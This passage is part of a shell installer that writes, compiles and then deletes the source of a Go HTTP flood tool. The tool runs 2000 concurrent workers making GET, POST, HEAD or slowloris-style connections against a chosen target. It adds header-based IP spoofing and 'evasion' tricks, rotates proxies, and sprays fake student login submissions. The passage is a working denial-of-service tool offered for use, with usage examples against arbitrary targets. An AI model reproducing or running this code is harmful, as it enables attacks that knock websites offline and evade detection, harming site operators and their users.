		"/.env", "/config.json", "/settings.ini", "/application.yml", 
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
	useProxy := false
	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
		useProxy = true
		fmt.Println("[+] Loading proxies from multiple sources...")
		loadProxiesFromMultipleSources()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			fmt.Println("[!] No proxies loaded, continuing without proxy")
			useProxy = false
		}
	}

	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST")
		fmt.Println("  ./main https://target.com 30 HEAD")
		fmt.Println("  ./main https://target.com 60 SLOW")
		fmt.Println("  ./main https://target.com 60 GET proxy")
		os.Exit(1)
	}

	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])

	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}

	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}

	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second

	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d\n", len(proxies))
	}
	fmt.Println("[+] IP Spoofing: ADVANCED (30+ headers, evasion enabled)")
	fmt.Println("[+] Starting... Press Ctrl+C to stop")

	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy, "")

	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()

	const workers = 2000

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackWorker(target, mode, done, stats, useProxy, connectionPool)
		}()
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %d sec\n", durationSec)
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}

			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			var req *http.Request
			var err error

			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				conn.SetDeadline(time.Now().Add(300 * time.Second))
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, generateRandomUA())
				stats.inc()
				time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}

			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s", generateStudentNumber(), randomString(randInt(8, 16)))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}

			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", generateRandomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			req.Header.Set("Connection", "keep-alive")

			// ADVANCED UNDETECTABLE IP SPOOFING
			addUndetectableHeaders(req)

			numSecurity := randInt(1, 2)
			for i := 0; i < numSecurity; i++ {
				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
				for k, v := range secHeader {
					req.Header.Set(k, v)
				}
			}

			numModern := randInt(2, 5)
			for i := 0; i < numModern; i++ {
				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
				for k, v := range modernHeader {
					req.Header.Set(k, v)
				}
			}

			if randInt(1, 100) <= 50 {
				numApp := randInt(1, 2)
				for i := 0; i < numApp; i++ {
					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
					for k, v := range appHeader {
						if v == "" {
							req.Header.Set(k, randomString(32))
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}

			if randInt(1, 100) <= 50 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}

			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully (Advanced Undetectable IP Spoofing)${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
go build -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]${NC}"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 HEAD${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
    echo
    echo -e " ${CYAN}►${NC} Advanced IP Spoofing: ${YELLOW}30+ headers, evasion techniques${NC}"
    echo -e " ${CYAN}►${NC} Proxy mode loads from ${YELLOW}16 different sources${NC}"
    echo -e " ${CYAN}►${NC} Undetectable features: ISP spoofing, geo-location, browser fingerprinting${NC}"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
